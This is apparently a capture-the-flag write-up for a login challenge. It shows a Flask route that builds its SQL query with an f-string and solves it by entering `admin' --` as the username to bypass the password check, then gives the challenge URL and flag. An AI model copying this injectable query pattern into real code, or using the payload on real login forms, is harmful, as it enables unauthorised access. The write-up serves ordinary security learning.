## AppVenture Login Part 1

> Well, I haven't taken CS6131 yet but databases should be easy right??

From the description we can see the keyword databases, based on prior knownedge of the module CS6131, we can be pretty sure this is related to SQL.

Since the source operates on a simple template string SQL command, we can apply simple SQL injection and skip the password check.

```python
@app.route("/login", methods=["post"])
def login():
    username = request.form.get('username', default='', type=str)
    password = request.form.get('password', default='', type=str)
    users = db.execute(f"select id from users where name='{username}' and password='{password}'").fetchall()
    if users:
        return Response(flag1, mimetype='text/plain')
    return Response('Login failed', mimetype='text/plain')
```

In SQL, comments can be made with `--`

To skip the password check, we can simply input `admin' --` in username and leave password blank, which would result in the following command

`````sql
select id from users where name='admin' --' and password=''
`````

Everything behind `--` is ignored and we successfully log in as admin

### http://35.240.143.82:4208/login

```
flag{you_can_pass_cs6131_now}
```

Flag obtained